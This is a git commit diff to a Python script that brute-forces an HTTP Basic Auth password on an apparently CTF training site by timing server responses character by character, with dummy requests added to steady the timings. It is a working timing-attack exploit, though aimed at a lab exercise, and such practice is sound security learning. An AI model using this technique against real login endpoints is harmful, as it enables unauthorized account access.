8dcd1e27b8b412ba312ec9ebde168600415082ab
Cuong Ngo <cuonngo93@gmail.com>
2016-11-07 15:17:23 -0800

    Updated

--- program2.py
+++ program2.py
@@ -16,21 +16,29 @@ def main():
         print(password)
         r = requests.get('http://wfp2.oregonctf.org/authentication/example2/',
                     auth=HTTPBasicAuth('hacker', password))
-        print(r.text)
+        if r.text == "Not authorized":
+            print(r.text)
+        else:
+            break
+    print("The password is:", password)
 
 def bruteForce(word):
     longestReponseTime = (0, '')
     for letter in alphaNumeric:
         password = word + letter
+
+        #Dummy request to get better timming results.
         requests.get('http://wfp2.oregonctf.org/authentication/example2/',
                     auth=HTTPBasicAuth('', ''))
         requests.get('http://wfp2.oregonctf.org/authentication/example2/',
                     auth=HTTPBasicAuth('', ''))
+        ###
+
         responseTime = requests.get('http://wfp2.oregonctf.org/authentication/example2/',
                     auth=HTTPBasicAuth('hacker', password)).elapsed.total_seconds()
-        requests.get('http://wfp2.oregonctf.org/authentication/example2/',
-                    auth=HTTPBasicAuth('', ''))
+
         print(password, responseTime)
+
         if longestReponseTime[0] < responseTime:
             longestReponseTime = (responseTime, letter)
     return longestReponseTime[1]
